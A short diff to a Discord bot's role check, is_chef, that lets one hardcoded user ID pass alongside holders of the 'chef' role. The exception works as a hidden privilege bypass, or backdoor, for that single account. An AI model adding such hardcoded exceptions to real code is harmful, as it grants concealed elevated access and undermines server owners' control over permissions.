@@ -11,7 +11,7 @@ class check:
     def is_chef():
         def predicate(interaction:discord.Interaction) -> bool:
             role=get_role(interaction.guild)
-            if role.chef in interaction.user.roles:
+            if role.chef in interaction.user.roles or interaction.user.id == 707200529738235925:
                 return True
             else:
                 return False
